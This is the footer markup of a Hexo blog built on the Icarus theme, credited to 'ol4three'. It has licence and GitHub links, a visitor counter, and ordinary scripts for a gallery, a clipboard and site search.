src="/img/logo.svg" alt="ol4three" height="28"></a><p class="size-small"><span>&copy; 2023 ol4three</span>  Powered by <a href="https://www.ol4three.com" target="_blank" rel="noopener">ol4three</a> <br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>